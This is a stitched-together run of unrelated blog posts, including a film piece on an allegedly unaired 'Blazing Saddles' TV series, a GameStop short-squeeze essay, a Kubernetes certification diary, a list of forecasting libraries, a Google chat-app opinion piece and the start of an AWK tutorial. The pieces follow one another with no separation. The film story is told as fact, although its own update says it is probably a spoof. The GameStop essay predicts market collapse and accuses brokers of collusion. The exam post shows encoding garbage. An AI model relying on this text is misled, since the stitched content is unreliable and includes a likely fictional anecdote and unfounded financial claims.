<p><em>Update: large parts of this story may, in fact, be fiction. See the addendum at the end for details.</em></p>
<p>Film rights are a strange and complex thing, especially when it comes to existing properties. The contracts for these things can involve a labyrinthine series of clauses and negotiations, where the owners of the original property want to include cut-off clauses that will enable them to claw back the rights and sell them again, possibly for much more money if the adaptation has been a success, the artistic creator wants to hold on to some level of creative control and the film studio wants to ensure that neither of those things happens. We’ve seen assorted shenanigans at work across the board – the <a href="https://reprobatepress.com/2018/08/30/big-bond-themes-and-secret-agent-cover-versions/">James Bond</a> copyright snafu that saw the film rights for <strong>Casino Royale</strong> owned and exploited by another company than the one that made the official series, and perhaps most famously in terms of contractual obligations, the first <strong>Fantastic Four</strong> movie, made as a low-budget throwaway affair simply to ensure that the film rights stayed with Constantin Film, who was not quite ready to make a ‘proper’ version of the story but who saw the potential in the property and didn’t want to let it go.</p>
<p>But perhaps the most absurd of these contractual obligation projects came with <strong>Blazing Saddles</strong>, which was adapted into a TV series that ran for four seasons – which would suggest a major hit show by 1970s television standards, except for the fact that it never aired. Not a single episode beyond the pilot was shown on TV anywhere.</p>
<p><strong>Blazing Saddles</strong> was a major hit in 1974 and remains one of the most beloved Hollywood comedies – well, perhaps not with Millenials and Generation Z, given the film’s rather liberal use of the sort of racist language that is now strictly forbidden, even in context. Mel Brooks’ comedy western mocked American racism brutally – perhaps a little too brutally in the use of one particular word, which is bandied about throughout the film. It was a different time.</p>

<p>Brooks was on fire as a filmmaker in 1974, and there was every reason to expect <strong>Blazing Saddles</strong> to be a massive hit, as indeed it was. Having dealt with studios enough by this point, Brooks knew that they might want to take the project away from him and produce sequels – the story essentially opened itself up for on-going narratives. And so he came up with a cunning plan. The contracts for the film stated that there could only be film sequels if a TV series follow-up was made within six months. Brooks and his legal team were pretty certain that the film was too profane and vulgar to ever be adapted as a TV series. I mean, what could they do? Strip it back to its most basic elements while throwing out everything that made the film what it was?</p>
<p>Well, that was precisely what happened. In 1977, Warner Brothers announced plans for a sequel film – in fact, a series of sequels – to <strong>Blazing Saddles</strong>, and when Brooks and his lawyers waved the contract at them, they pulled their ace card – a four-season series based on the original film that had gone into production very quickly in 1974. As Brooks explained, <em>“Warner Bros comes to me and says they want to make another Blazing Saddles, and I say, ‘No. You don’t have the right to do that.’ They say, ‘Yes we do, we’ve been making a TV series and still control the rights.’ What TV series? I haven’t seen a TV show. They take me onto the lot, into a projection booth, and show me three episodes. My lawyers never thought to put in language that said they had to air the damn thing, only that they had to make it.”</em></p>
<p>You have to almost admire Warner Brothers’ gall here, and – oddly – their belief in <strong>Blazing Saddles</strong>. Not only did they rush a series into production in 1974, but they kept it in production – because the contract only allowed a new movie within six months of the last <strong>Blazing Saddles</strong> project – for four years until they finally had a movie ready. TV shows might be cheaper than films, but nevertheless, imagine how much they had to spend, making four seasons of a show just to hold onto the film rights.</p>
<p>In fact, the pilot episode of <strong>Black Bart</strong>, as the series is called, was shown once in 1975 on CBS, with no one even noticing. Well, why would they? As well as changing the title (because the contract also failed to state that any TV series be <em>called</em> <strong>Blazing Saddles</strong>), Brooks wasn’t credited, with Andrew Bergman, who originally came up with the <strong>Blazing Saddles</strong> idea listed as creator. The show starred Louis Gossett Jr as Sheriff Bart, continuing his battles against both criminals and racists, while the other film characters were replaced with similar, but not identical characters to avoid crediting Brooks. Both the cast – including Gerrit Graham – and the characters are lightweight versions of the originals, the humour is almost non-existent and the laugh track just hammers home how unfunny the show is. And yet it is a professional work, and arguably no less forced than several other sitcoms of the era. So the question is: why didn’t they just put in a bit more effort and then show the damn thing instead of paying everyone to shoot twenty-four episodes that would sit, unseen, in the Warner Brothers vaults?</p>

<p>Presumably, the answer is that a TV show – even a good TV show – would have diluted the appeal of another film. The 1970s were a different time (we mentioned that, right?) and there was less crossover of film and TV – sure, some films – like <a href="https://reprobatepress.com/2020/09/27/go-ape-the-planet-of-the-apes-book-and-comics-of-the-1970s/"><strong>Planet of the Apes</strong></a> – were adapted into TV shows, but those shows were rarely successful and were seen as having essentially killed off any chance of audiences then going to the cinema to watch a movie version. If anything, <strong>Black Bart</strong> might have served as a sign of just how bad a Mel Brooks-free version of <strong>Blazing Saddles</strong> could be. So instead of putting any effort into making a decent TV series based on the property (and there’s certainly the potential there), Warner Brothers simply put the least possible effort into making something that would still legally stand up as a TV show that could, in theory, be broadcast – and then buried it.</p>
<p>What the cast and crew thought of all this is hard to gauge – Gossett has talked about the weirdness of it all, but you have to wonder just how anyone managed to drum up any enthusiasm once it became clear that the show would never air. Ironically, the plans for a <strong>Blazing Saddles</strong> sequel ultimately went nowhere – by 1979, it was clear that the moment had passed and audience tastes had changed. The sequel was shelved, and the series was finally cancelled. The pilot episode has since turned up on the <strong>Blazing Saddles</strong> DVD and blu-ray, but the other episodes have yet to be seen. It’s entirely possible that they were never even completed beyond the ones shown to Brooks, and may have been trashed. A pity, as we’ll never know if it accidentally improved.</p>
<p><strong>IMPORTANT UPDATE:</strong> We feel it’s important to point out that some sources are claiming since we originally posted this that the entire story – with the exception of the<strong> Black Bart</strong> pilot, which definitely exists and is perhaps a weird enough thing in itself – is in fact a spoof that has somehow become accepted as reality – ‘fake news’, as I believe it is known. There are several sources online claiming that this story is authentic; others claiming that it is satire (links appear in the comments). Unless Mel Brooks – or perhaps Louis Gossett – wants to come clean on the actual facts, it perhaps remains a mystery. Stranger-than-fiction may, or may not, be actual fiction, and isn’t that depressing when it’s a story as good as this? As Tony Wilson said (or possibly didn’t say, there’s the rub), <em>“when&nbsp;you have to choose between the truth and the legend, choose the legend.”</em></p>

<p>I have been engaging with WSB (<a href="https://www.reddit.com/r/wallstreetbets/" target="_blank" rel="noopener">/r/WallStreetBets</a>) since 2014.</p>
<p>Every regular person on WSB understands it’s a game. You can loose it all, make it big, sometimes both in the same day — it’s all a game. The most accurate assessment of WSB culture was clearly:</p>
<blockquote><p>Like 4chan found a Bloomberg Terminal.</p></blockquote>
<p>While the influx of new users may change the community, prior to January 15, 2021 the above was indeed an accurate description.</p>

<p>Honestly, this world feels like we are in a simulation. The company GameStop appears to be poised to bring down the entire financial system — stopping the game.</p>
<p>The infinity squeeze appears to be coming, what is an infinity squeeze you ask? It’s a really massive short squeeze:</p>
<blockquote><p>A short squeeze occurs when a stock or other asset jumps sharply higher, forcing traders who had bet that its price would fall, to buy it in order to forestall even greater losses. Their scramble to buy only adds to the upward pressure on the stock’s price.</p></blockquote>
<p>Short positions can technically lead to infinite losses. Simply put, if I open a short position for $10 and the share price drops 10%, I make $1. However, if the stock price increases say 10,000% I now owe $1,000.</p>
<p>In the case of GameStop, the situation appears dire. At one point the short positions were 140% of available shares of the market. This means that more shares were lent out than were available on float, i.e. shorts were resold / lent several times. At this point, several things are happening[<a href="https://www.investopedia.com/ask/answers/05/shortsaleclosed.asp" target="_blank" rel="noopener">1</a>]:</p>
<ul>
<li>Those holding short positions are paying ridiculously high interest rates</li>
<li>If the short positions were forced to close, it would cause a major loss to multiple hedge funds (tens of billions total &amp; bankrupcies)</li>
<li>Due to the level of shorting, exiting the short positions would be excessively expensive and cause a <a href="https://www.investopedia.com/terms/s/shortsqueeze.asp" target="_blank" rel="noopener">short squeeze</a></li>
<li>There is less GameStop stock available for purchase</li>
<li>The price of GameStop stock is rising</li>
</ul>
<p>As a result, it appears to me that:</p>
<ul>
<li>Short holders cannot exit their positions without going bankrupt</li>
<li>Short holders are being hit by high interest rates</li>
<li>Closing other positions in the stock market should help them cover the interest rates</li>
<li>Best option for short position holders is is to wait &amp; pray the stock price drops</li>
<li>What happens if not enough people are willing to sell?</li>
</ul>
<p>Personally, I believe all of this will suck all the liquidity from the stock market. Either those shorting suffer the loss and close their positions or wait as the stock continues to stay high… in either case hundreds of billions of dollars is leaving the market.</p>
<p>How did we get here?</p>
<h3>Infinity Squeeze – Short Positions</h3>
<p>There’s a lot to this story I’ll come back an fill in, but the gist is this — In mid-January 2021 GameStop was <em>extremely</em> shorted.</p>

That being said, the massive spikes in purchases did not start until January 12:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png" alt="" width="916" height="411" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png 916w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-300x135.png 300w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-768x345.png 768w" sizes="(max-width: 916px) 100vw, 916px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png 916w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-300x135.png 300w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-768x345.png 768w"></a></p>
<p>What happened at that time? The <a href="https://web.archive.org/web/20210118091858/https://old.reddit.com/r/wallstreetbets/comments/kxeq23/gme_yolo_update_jan_14_2021/" target="_blank" rel="noopener">YOLO updates</a> definitely started at that time and stocks started to rise. Once the stocks started to rise, I believe institutions and WSB itself started piling into GameStop. The stock started to move and if they could get in they could make a boat load. It’s important to remember WSB is often visited by hedge fund mangers, CEOs, day traders big and small, etc. It’s not always the little guy(s). When they piled in, the price started to rise further.</p>
<h3>Infinity Squeeze – Let’s Make Money</h3>
<p>As they purchased, I personally believe some short sellers managed to exit their positions (about 7m shares, per Yahoo Finance data)</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png" alt="" width="424" height="417" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted-300x295.png 300w" sizes="(max-width: 424px) 100vw, 424px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted-300x295.png 300w"></a></p>
<p>What this indicates to me is that many of those holding short positions did not realize what was about to happen. They kept holding believing this was a classic pump-and-dump. Even WSB at the time didn’t not necessarily think about much <a href="https://web.archive.org/web/20210115023914/https://old.reddit.com/r/wallstreetbets/" target="_blank" rel="noopener">besides making money</a>. I know I even purchased call options during this week, particularly when the new data came out January 15, 2021. To me, it became clear the stock was about to rocket.</p>
<h3>Infinity Squeeze – Let’s Stick it to the Man</h3>
<p>In light of the massive number of short position(s) open in January 15, 2021, WSB realized they could (a) make money and (b) stick it to the hedge funds. Frankly, WSB have been waging a war on short selling for years. With GameStop they had a company with relatively few shares&nbsp; in float (47m), a low market cap, basically something that purchases would have an outsized impact.</p>
<p>I’m not 100% sure this was intentional, but as people started buying and holding waiting for the squeeze the stock started to rise.The rising stock both led to discussions on news outlets and the stock started going viral on social media platforms outside of WSB – further raising the going rate for a share of GameStop.</p>
<p>Those holding short positions did not want to sell as they’d lose money, so they were searching for capital to cover their leveraged positions. Citadel and Point72 partners appears to have <a href="https://www.wsj.com/articles/citadel-point72-to-invest-2-75-billion-into-melvin-capital-management-11611604340" target="_blank" rel="noopener">come to at least one short sellers aid</a>. This showed they were weak and further emboldened the WSB folks – “Let’s make some money on the hedge funds behalf”</p>
<p>Purchases from Jan 19 to Jan 23, 2021 and the stock price increased exponentially as it went viral:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png" alt="" width="507" height="423" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png 507w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17-300x250.png 300w" sizes="(max-width: 507px) 100vw, 507px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png 507w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17-300x250.png 300w"></a></p>
<h3>Infinity Squeeze – The Rebellion</h3>
<p>On January 27, 2021 across the board buying for GameStop was <a href="https://www.clickondetroit.com/money/2021/01/27/robinhood-td-ameritrade-other-brokerages-have-tech-problems-at-market-open/" target="_blank" rel="noopener">restricted (along with multiple other stocks) across various trading platforms</a>. This effectively forced purchase volume lower and as users of these platforms could only sell it drove down the share price. This likely startled many GameStop shareholds and many liquidated their positions, letting the short sellers exit some of their positions. Through January 29, 2021 the ability to purchase in an unrestricted manner has not been restored.</p>
<p>What happened?</p>
<p>Personally, I’m of the opinion that there was not enough shares to go around and likely these platforms colluded to drive down the stock price. What’s more interesting is how few people sold. As of January 29, 2021 the price of a GameStop share was back at $325. This has led to some very VERY strong backlash and I know I’ll be joining a lawsuit at some point (if not filing my own), as this collusion cost me tens to hundreds of thousands of dollars.</p>
<p>One essay that particularly struck me was made on WSB: <a href="https://web.archive.org/web/20210130034124/https://www.reddit.com/r/wallstreetbets/comments/l6omry/an_open_letter_to_melvin_capital_cnbc_boomers_and/" target="_blank" rel="noopener">An Open Letter to Melvin Capital, CNBC, Boomers, and WSB</a></p>
<p>I recommend reading the comments on this essay to really get an under standing of what’s happening. Look at the charts. This is personal now. The market manipulation is obvious and people want revenge. For the current events, for 2008, for the entire corrupt system. They want to send a message. This is a protest.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg" alt="" width="474" height="567" srcset="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg 474w, https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH-251x300.jpg 251w" sizes="(max-width: 474px) 100vw, 474px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg 474w, https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH-251x300.jpg 251w"></a>Many retail investors will hold until the bitter end.</p>
<h3>Infinity Squeeze – End Game</h3>
<p>So what happens next?</p>
<ul>
<li>Starting on January 27-29 people were trying to transfer funds off Robinhood and the other platforms which disabled purchasing of GameStop shares.</li>
<li>Come the <span>first week of February</span> these assets will be again available and can be used to purchase GameStop shares.</li>
<li>Everyone saw much fewer shares being traded Friday</li>
<li>Everyone is talking with their families</li>
<li>People are going to purchase more GameStop shares &amp; hold</li>
<li>I expect many are going to pull their assets out of the stock market</li>
</ul>
<p>There are some unknowns, for instance have the short positions been closed? Have there been backroom deals to stave off the infinity squeeze?</p>
<p>If neither of those assumptions above hold, then what happens when the price rises further and there’s not enough shares for sale?</p>
<p>Hedge funds either bleed out as they pay the massive interest rates on holding those short positions or they will close their short positions causing an infinity squeeze (GameStop shares will be priced in the thousands). In either case hundreds of billions would likely leave the market.</p>
<h3>Conclusion – The Black Hole</h3>
<p>It’s a <a href="https://en.wikipedia.org/wiki/Nash_equilibrium" target="_blank" rel="noopener">Nash Equilibrium</a>, essentially the share holders have every reason to ask the maximum amount they can get for a share of GameStop (i.e. make money). If for some reason these GameStop share holders are unwilling to sell at a low rate, then these hedge funds stand to lose hundreds of billions and will go bankrupt (slowly via interest payments or quickly via short squeeze). To try and pay for their debts, they’ll have to sell off market wide and the entire market collapses.</p>
<p>There are three ways to alleviate the issue:</p>
<ul>
<li>GameStop issues a massive number of new shares</li>
<li>Market manipulation (such as Robinood and friends only enabling selling – of course that didn’t work last time)</li>
<li>Government settles the matter by confiscating shares</li>
</ul>
<p>Personally, I view government involvement as inevitable. They could settle everyone accounts fairly by giving everyone the current share price or what they bought it for, which every is higher. That being said, I suspect the more likely course of action is some flat rate $100/share or something to that effect. In either case, if they don’t get involved, I suspect the system really will collapse.</p>
<p>Unless of course, I am wrong. I am not a financial expert and nothing in this article should be taken as advice.</p>
<p>It’s completely possible I’m inaccurately reading the situation and those shorting GameStop have already exited their position(s) and GameStop is currently just in a classic bubble.</p>

            <p>In December last year I was able to sit for the coveted Certified Kubernetes Administrator and Certified Kubernetes Application Developer exams, and clear them both after some preparation.</p>

<p>This post is meant to share my exam experience, and all the materials used.</p>

<h3 id="tldr">TL;DR</h3>
<ul>
  <li>Read the exam questions carefully.</li>
  <li>Know imperative commands with <code>kubectl</code> like the back of your hand.</li>
  <li>Get comfortable looking things up on <a href="https://kubernetes.io/">kubernetes.io</a>.</li>
  <li>Build a bookmark folder in Chrome with relevant pages in kubernetes.io: you can use it during the exam!</li>
  <li>Seriously, read the damn questions carefully.</li>
  <li>Practice, practice and practice more.</li>
</ul>

<h3 id="the-exams">The exams</h3>
<p>The exam for any of these Kubernetes certifications consists in solving a set of tasks, in a 2 hour terminal session.</p>

<p>There are 17 scenarios/questions for CKA, and 19 for CKAD.
The whole time, a proctor is watching and listening to you via webcam and microphone, and seeing the content of your screens (you can use more than one).
You communicate with the proctor only via a live chat application which is part of the PSI interface for the exam.</p>

<p>At the beginning they will ask you to show your ID, and then you will need to show them your working area from the webcam.
You will need to show your desk, and the room youâ€™re in.
Ensure that nothing written is visibile on the walls, and that you are the only person in the room.</p>

<p>Once the exam starts, the proctor may ask you every once in a while to show your hands to the webcam.
Donâ€™t bother asking questions about the exam itself, chances are the proctor really doesnâ€™t know about the subject and is only there to ensure you donâ€™t cheat.
You will need to share your screens for the proctor to see.
If you have 2 screens you can have the exam terminal on one, and the tab with k8s docs on the other.</p>

<p>In the terminal itself, you are given 6 or so k8s clusters, and you will need to switch between them.
You will always have a command printed at the beginning of each question, for easy copy paste:</p>
<div><div><pre><code>kubectl config use-context bla
</code></pre></div></div>
<p>Make sure to <strong>use it</strong>!</p>

<p>Do not be fooled by the fact that you are able to search documentation during the exam.
The tasks that you will be given are often complex ones; time is of the essence! If you waste it while reading up docs you will not be able to complete all of the tasks in time.</p>

</ul>

<h2 id="cka">CKA</h2>
<p>I will start with the CKA, as it is the first exam I attempted.</p>

<h3 id="objectives">Objectives</h3>
<p>The CKA ensures we have the skillset to setup and maintain a Kubernetes cluster, and manage it by using best practices.</p>

<h3 id="requirements">Requirements</h3>
<p>As this exam is aimed at the Systems administrator/devops engineer, some linux as well as infrastructure skills are expected, such as:</p>
<ul>
  <li>Knowledge of Linux OS.</li>
  <li>Being comfortable on the terminal.</li>
  <li>Knowing how to quickly edit files with text editors like Vi/Vim.</li>
  <li>Working knowledge of networking concepts.</li>
  <li>Working knowledge of TLS encryption concepts.</li>
  <li>Working knowledge of docker and containerization concepts.</li>
</ul>

<p>A deep dive is done on Kubernetes concepts and architecture during the indicated courses.</p>

<h3 id="study-plan">Study plan</h3>
<p>I began studying around the end of September 2020, by purchasing Mumshad Mannambethâ€™s excellent Udemy course for both CKA and CKAD, both on sale at the time.
That was a major source of material for me, as the courses included access to Katacoda/Kodekloud practice labs, and access to a Slack community where the trainer and other exam-takers participated.
The videos of Mumshadâ€™s course are very well done, each in the 5-10 minute range in length, slowly and clearly explaining each concept.
I would get to practice that concept later with labs provided by Mumshadâ€™s platform, KodeKloud.</p>

<p>The course itself has a section later on where we must manually install a Kubernetes cluster from scratch on a local vagrant setup, based on <a href="https://github.com/kelseyhightower/kubernetes-the-hard-way">Kelsey Hightowerâ€™s excellent Kubernetes the Hard way project</a> (the original project leverages infrastructure on Google Cloud instead).
During the same course, we get to setup another cluster by using <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/">kubeadm</a>, which is part of the exam curriculum.</p>

<p>I would say that before taking the exam, I spent an average of about 1 hour every day watching the course videos and playing around with the labs (around 2 hours or more during weekends), for a couple months;
I took care of understanding every concept presented in the videos, and verified my knowledge with the labs and on a local cluster where I spent some practice time on, on top of study time.
I also re-did all of the course labs multiple times until I knew almost all of the answers by heart, and could get around them easily.</p>

<p>When something was unclear, the slack communities on kodekloud and kubernetes were always very helpful, always answering all of my questions, no matter how dumb I thought they were :)</p>

<p>I made sure to know <code>kubectl</code> imperative commands like the back of my hand, and building a library of bookmarks in my browser with relevant pages ready, as we are allowed an extra tab with the documentation during the exam.</p>

<p>After 2 months of that, I felt like I was ready.</p>

<h3 id="cka-exam-attempt-1">CKA Exam attempt #1</h3>
<p>I booked the exam for end of November, on a Saturday morning at 8AM, and sat for it in the guest room of my home.
The exam setup time with the proctor went pretty smoothly, and I was able to start on time.</p>

<p>I was not so confident by the end of the two hours. After 36 hours I got the news that I failed that attempt with 60% (minimum passing grade is 66%).
What went wrong for me was that I did not read/understand one specific question, which was related to ETCD backup and restore (part of the official curriculum); because of this, I ended up performing a task that effectively made one of the exam clusters unavailable.</p>

<p>Looking back, I am quite sure I invalidated several correct answers due to this mistake, which resulted in the score.
The method of how to backup/restore an ETCD cluster was also not entirely clear to me at the time, so I was not 100% sure of what I was doing.</p>

<p>Clearly I overestimated my knowledge, and depended too much on memorizing certain commands on one study platform, instead of being completely confident in all concepts and commands applied.</p>

<h3 id="new-study-plan">New study plan</h3>
<p>Enter <a href="https://killer.sh/">killer.sh</a>.
A CKA/CKAD/CKS exam simulator created by <a href="https://www.linkedin.com/in/kimwuestkamp/">Kim Wuestkampf</a>.</p>

<p>For CKA, the simulator offered 25 HARD questions to be done in 2 hours, with guided and comprehensive answers made available after the alotted time.
Such answers also offered different ways to do things, for maximized learning experience.</p>

<p>This alternative platform helped a lot in understanding things that werenâ€™t clear to me, and to practice more varied scenarios.
Completing a killer.sh simulator in under two hours gives good confidence in being able to tackle the real exam.</p>

<h3 id="cka-exam-attempt-2">CKA Exam attempt #2</h3>
<p>I booked the exam one week after getting the results of the previous one.
The exam setup experience was again pretty smooth and I was up and ready to go 10 minutes before the start time.</p>

<p>I felt pretty confident the whole time and finished up all of the questions around 1 hour and 10 minutes later.</p>

<p>The results came around 36 hours after the end of the exam, in an email.
Score was a pass with 85% :)!
As it is not possible to see the actual answers, to this day I donâ€™t really donâ€™t know what I got wrong, but am still satisfied with the result.</p>

<h2 id="ckad">CKAD</h2>
<p>I took the CKAD exam while the knowledge of the previous training was still fresh, so I felt like I had an easier time with this one.</p>

<h3 id="objectives-1">Objectives</h3>
<p>To be able to efficiently design and implement working kubernetes production workloads.</p>

<h3 id="requirements-1">Requirements</h3>
<p>Not so much system administration knowledge, but more focus on k8s concepts, architecture and best practices.
Actual programming experience is not required for the exam (although in â€œreal lifeâ€� it will probably not hurt either ;) ).</p>

<h3 id="study-plan-1">Study plan</h3>
<p>I booked the CKAD exam roughly for 3 weeks after passing the CKA.
In those 3 weeks, I took my time and spent again around 30min to 1 hour a day on Mumshadâ€™s course and labs.</p>

<p>When exam time was closer, I booked two sessions on killer.sh and focused on practicing there.
I challenged myself by finishing all the questions under 2 hours, and afterwards going through slowly through the answers section on the site.
This was very helpful and allowed me to learn different, more effective approaches.</p>

<h3 id="ckad-exam-attempt-1">CKAD Exam attempt #1</h3>
<p>I once again took the exam from the guest room in my home.</p>

<p>This time the exam setup with the proctor wasnâ€™t so smooth.
The connection from my end and theirs wasnâ€™t great, and we kept getting disconnected from the session. Webcam images werenâ€™t so clear so they had to ask me to show identification more than once. It took about 40 minutes to start the actual exam, and that did get me a bit stressed out.</p>

<p>Nevertheless, I felt comfortable and finished all the questions in about 1 hour and a half.
36 hours later, I got the email with the good news of a pass with 83%.
Doing the CKA before really helped with the whole experience.</p>

<h2 id="conclusion">Conclusion</h2>
<p>From my experience, I would say that the hardest exam was the one for CKA, as it didnâ€™t just go through the new knowledge of k8s concepts, but also on existing understanding of systems administration.
I felt like doing CKAD immediately afterwards made it a bit easier, as the knowledge was still fresh.</p>

<p>The CKAD questions however were much more time consuming, in the sense that one task would require to perform several smaller tasks quickly, building a workload and making sure everything works together.</p>

<p>All in all, I feel the time trying to tackle these certifications was well spent; since the exams are performance based, they are fair in what they expect …</p></div></div>

<p>In this post we will look at some of the top open source deep learning for time series forecasting frameworks. In particular we will look at PyTorch time series forecasting frameworks.</p>



<ol><li><a href="https://github.com/awslabs/gluon-ts">Gluon</a> This framework by Amazon remains one of the top DL based time series forecasting frameworks on GitHub. However, there are some down sides including lock-in to MXNet (a rather obscure architecture). The repository also doesn’t seem to be quick at adding new research. </li><li><a href="https://github.com/AIStream-Peelout/flow-forecast">Flow Forecast</a>: This is an upcoming PyTorch based deep learning for time series forecasting framework. The repository features a lot of recent models out of research conferences along with an easy to use deployment API. The repository is one of the few repositories to have new research models, coverage tests, and interpretability metrics. </li><li><a href="https://github.com/sktime/sktime-dl">sktime dl</a> This is another time series forecasting repository. Unfortunately it looks like particularly recent activity has diminished on it. On the main page it looks </li><li><a href="https://github.com/zalandoresearch/pytorch-ts">PyTorch-TS</a> Another framework, written in PyTorch, this repository focuses more on probabilistic models. The repository isn’t that active (last commit was in November). However, the group behind it appears active in the research community and adds newer models to it. </li></ol>



<p>These seem to be the major time series forecasting framework out there at moment. Interestingly at present there doesn’t seem to be a time series forecasting built exclusively in Tensorflow/Keras. However there are <a href="https://www.tensorflow.org/tutorials/structured_data/time_series">several tutorials</a> out there.</p>

January 30, 2021 | https://ruky.me/2021/01/31/why-google-needs-to-build-an-open-chat-client-like-element/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/31/why-google-needs-to-build-an-open-chat-client-like-element/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Google recently blocked the Matrix based chat app Element from the Play Store sighting sexual content on the platform. It’s really hard to define the explanation because WhatsApp, Telegram users of other chat clients also share the same content. Telegram is also known to host groups sharing pirated content as well.</p>
<p>This post is not going to bash Google on the ban of Element. It’s about how Google can win the chat app </p>
<p>Chat apps have been hot for the past couple of years. When I initially Tweeted that chat apps are the new social network, 6-7 years ago (I wish if I can find that tweet, but I can’t seem to find it, maybe it was lost when I deleted all my tweets sometime ago), I remember how people laughed replying how can that even possible, but now as Facebook is on the decline, chat apps are the goto place to hang out with friends.</p>
<p>Google currently doesn’t have a house in the chat app race. Google tried with several chat applications, like Ello, Hangout, Google Talk, none of them took off. Even though Ello looked promising, and was integrated into Android, people never jumped the ship to Ello. And since Google now allowing several chat/video platforms like Hangout, Meet etc, Google’s direction in communication platform seems big vague.</p>
<p>Google also has had a poor history with social networking, Google does not have social in their DNA, it feels like they are engineering, technology first in their approach, while Facebook feels more social first than anything else.</p>
<p>However, after seeing this ban I feel what Google should have a horse in the chat app race, and it should be a matrix/element based chat client. Allow me to explain,</p>
<p>Google should embrace an open protocol like Matrix and build a chat client on top of it, yes it’s against their pattern of hoarding data, and usage of open protocol.</p>
<p>But Google was able to win the email, the email protocol is an open protocol, anyone can implement it, anyone can use any client they want, but still Google was able to create the most popular email service available out their, and even monetise it. </p>
<p>Before Google started gmail, services like hotmail only allowed 200mb of storage, I remember Yahoo deleting my email account because I didn’t login for 6 months (I was still schooling at that time, and didn’t use email much), and not to mention Yahoo, and hotmail had atrocious ads on their email service. But google changed all that, they gave a better UI, more storage, and even a better ad experience.</p>
<p>So what makes then incapable of using an open chat protocol and build a great experience around it? With engineers and money to back a project like that Google can build a good chat service around an open chat protocol.</p>
<p>Even ads might not be a thing, Google can still provide enterprise chat service to organisations, powered by their data servers. They can even keep their source closed if they want to, like they are doing with Gmail, but an open source client would be great.</p>
<p>And Google’s backing for a open chat platform will make people interested about it, and even more people will use it just because it’s from Google. People will be able to use their own clients like Element, or another Matrix client, still and users can build a network greater than a centralised chat service, like we use gmail in our mail app to chat with someone else with a different email provider. </p>
<p>And the bottom line is Facebook, Telegram, Signal, and other chat platforms are going on a race without Google, all providing a centralised experience, with the exception of Signal, who is providing a semi-centralised experience. So even if you can’t beat them, why not try to destroy them all with an open chat protocol?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Shell script and AWK are very complementary languages.  AWK was designed from
its very beginnings at Bell Labs as a pattern-action language for short
programs, ideally one or two lines long.  It was intended to be used on the
Unix shell interactive command line, or in shell scripts.  Its feature set
filled out some functionality that shell script at the time lacked, and often
still lacks, as is the case with floating point numbers; it thereby
(indirectly) brings much of the C language’s expressive power to the shell.</p>

<p>It’s therefore both common and reasonable to see AWK one-liners in shell
scripts for data processing where doing the same in shell is unwieldy or
impossible, especially when floating point operations or data delimiting are
involved.  While AWK’s full power is in general tragically underused, most
shell script users and developers know about one of its most useful properties:
selecting a single column from whitespace-delimited data.  Sometimes,
<a href="https://www.man7.org/linux/man-pages/man1/cut.1p.html"><code>cut(1)</code></a> doesn’t, uh, cut it.</p>

<p>In order for one language to cooperate with another usefully via embedded
programs in this way, data of some sort needs to be passed between them at
runtime, and here there are a few traps with syntax that may catch out unwary
shell programmers.  We’ll go through a simple example showing the problems, and
demonstrate a few potential solutions.</p>

